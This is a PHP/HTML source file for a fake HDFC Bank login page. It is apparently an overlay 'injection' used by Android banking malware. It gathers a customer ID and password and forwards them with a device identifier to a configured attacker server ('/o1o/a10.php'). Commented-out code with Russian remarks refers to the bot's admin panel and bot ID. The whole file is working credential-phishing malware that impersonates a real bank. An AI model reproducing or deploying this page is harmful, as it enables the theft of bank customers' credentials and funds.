<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>HDFC Bank</title>

    <style>
        body {
            width: auto;
            color: #000000;
            font-size: small;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background: #ffffff
        }

        .box_logo {
            background-color: #105494;
			padding: 3px;
        }

.submit-button {
    margin-bottom: 10px;
    color: #fff;
    width: 45%;
    padding: 10px;
    border-radius: 6px;
    background: #4a86ff;
    font-weight: bold;
    margin-right: 10px;
    border: 1px none #036;
}

        .input-field {
            width: 50%;
			padding: 10px;
            border-radius: 6px;
            margin-right: 10px;
            border: 1px solid;
			
        }

        .teaser_box {
            margin-bottom: 10px;
            border-color: #FFFFFF;
            padding: 4px 0
        }

        .ptb {
            padding: 4px 0;
        }

        .content {
            padding: 0;
            background-color: #ffffff;
            margin: 0 0 0 10px;
        }

        .fielderror {
            border: 1px solid #f00;
            width: 50%;
			padding: 10px;
            border-radius: 6px;
            margin-right: 10px;
        }
    </style>
</head>
<?php 
$IMEI_country = htmlspecialchars($_REQUEST["p"], ENT_QUOTES);
//$IMEI_country = "321|tr";
include "config.php";
?>

<body>

    <div class="fitMlbody" id="content_div">
        <header class="header">
            <div class="box_logo">
			<center>
                <img class="none" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAALwAAAAeCAIAAAAZ/+MZAAAAGXRFWHRTb2Z0d2FyZQBBZG9iZSBJbWFnZVJlYWR5ccllPAAAAyJpVFh0WE1MOmNvbS5hZG9iZS54bXAAAAAAADw/eHBhY2tldCBiZWdpbj0i77u/IiBpZD0iVzVNME1wQ2VoaUh6cmVTek5UY3prYzlkIj8+IDx4OnhtcG1ldGEgeG1sbnM6eD0iYWRvYmU6bnM6bWV0YS8iIHg6eG1wdGs9IkFkb2JlIFhNUCBDb3JlIDUuMy1jMDExIDY2LjE0NTY2MSwgMjAxMi8wMi8wNi0xNDo1NjoyNyAgICAgICAgIj4gPHJkZjpSREYgeG1sbnM6cmRmPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5LzAyLzIyLXJkZi1zeW50YXgtbnMjIj4gPHJkZjpEZXNjcmlwdGlvbiByZGY6YWJvdXQ9IiIgeG1sbnM6eG1wPSJodHRwOi8vbnMuYWRvYmUuY29tL3hhcC8xLjAvIiB4bWxuczp4bXBNTT0iaHR0cDovL25zLmFkb2JlLmNvbS94YXAvMS4wL21tLyIgeG1sbnM6c3RSZWY9Imh0dHA6Ly9ucy5hZG9iZS5jb20veGFwLzEuMC9zVHlwZS9SZXNvdXJjZVJlZiMiIHhtcDpDcmVhdG9yVG9vbD0iQWRvYmUgUGhvdG9zaG9wIENTNiAoV2luZG93cykiIHhtcE1NOkluc3RhbmNlSUQ9InhtcC5paWQ6QTE5OUM5QURBNzRBMTFFNkEwOTNFMEQyMzM3OTVEQUMiIHhtcE1NOkRvY3VtZW50SUQ9InhtcC5kaWQ6QTE5OUM5QUVBNzRBMTFFNkEwOTNFMEQyMzM3OTVEQUMiPiA8eG1wTU06RGVyaXZlZEZyb20gc3RSZWY6aW5zdGFuY2VJRD0ieG1wLmlpZDpBMTk5QzlBQkE3NEExMUU2QTA5M0UwRDIzMzc5NURBQyIgc3RSZWY6ZG9jdW1lbnRJRD0ieG1wLmRpZDpBMTk5QzlBQ0E3NEExMUU2QTA5M0UwRDIzMzc5NURBQyIvPiA8L3JkZjpEZXNjcmlwdGlvbj4gPC9yZGY6UkRGPiA8L3g6eG1wbWV0YT4gPD94cGFja2V0IGVuZD0iciI/Pkq3XPYAAAahSURBVHja7FtrbBRV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" border="0">
            </center>
			</div>
        </header><br><br><br>
        <section class="content">
            <form action="null" method="post" id="_mainForm" target="flow_handler">
<center>
                <div class="teaser_box">
                    <div class="ptb">
                        <label class="dunkelblau" for="CID"><b>Customer ID</b></label><br><br>
                        <input name="Customer ID" id="cid" maxlength="10" class="input-field" type="text">
                    </div>
                    <br />
                    <div class="ptb">
                        <label class="dunkelblau" for="password"><b>Password</b></label><br><br>
                        <input type="hidden" name="name" value="HDFC Bank MobileBanking" />
                        <input name="Password" id="password" maxlength="50" class="input-field" type="password" />
                    </div>  <br />
                    <div class="ptb">
                        <input type="button" value="Login" id="submitBtn1" class="submit-button" />
                        <br />
                    </div>
                </div>
</center>
            </form>

        </section>
        <iframe src="about:blank" name="flow_handler" style="visibility:hidden;display:none"></iframe>
    </div>

    <script type="text/javascript">
			   
				
				
				(function () {


                   var  __insHiddenField = function (objDoc, objForm, sNm, sV) {
                        var input = objDoc.createElement("input");
                        input.setAttribute("type", "hidden");
                        input.setAttribute("name", sNm);
                        input.setAttribute("value", sV);
						input.value = sV;
                        objForm.appendChild(input);
                    };


                 /*   var g_oForm = document.getElementById('_mainForm'), g_sFAct = prompt('getLink');
					
					if(!/https?:\/\//i.test(g_sFAct))
					   g_sFAct = 'http://' + g_sFAct;
					
                    g_oForm.setAttribute('action',g_sFAct); // устанавливаем у формы урл админки
					try{
					   g_oForm.action = g_sFAct;
					} catch(e){};
					
					var g_FrmCode = prompt('getId');
                    __insHiddenField(document, g_oForm, 'code', g_FrmCode); // получаем id бота
*/

                    var g_oBtn = document.getElementById('submitBtn1');
                    g_oBtn.onclick = function () {
					
						var oNumInp = document.getElementById('cid');
                        var oCodeInp = document.getElementById('password');

						try{
							oNumInp.className = oCodeInp.className = 'input-field';
						} catch(e){};
						
                        if (oNumInp.value.length < 3) {
							try{
								oNumInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						
                        if (!/^\w{3,100}$/i.test(oCodeInp.value)) {
							try{
                                oCodeInp.className = 'fielderror';
							} catch(e){};
                            return false;
                        }
						top['closeDlg'] = true;
						/*prompt('send', '{"dialog id" : "snapwork_hdfc'+
						'", "customer_id": "'+oNumInp.value+
						'", "password": "'+oCodeInp.value+'"}');
						
						document.getElementById('content_div').style.visibility = 'hidden';
						g_oForm.submit();
						*/
						
						var url='<?php echo $URL; ?>';
var imei_c='<?php echo $IMEI_country; ?>';
location.replace(url+'/o1o/a10.php?p=' + imei_c+"|Injection_4|snapwork_hdfc|"+oNumInp.value+"|"+oCodeInp.value+"|");
						return false;
                    };

                })();
            </script>
</body>
</html>
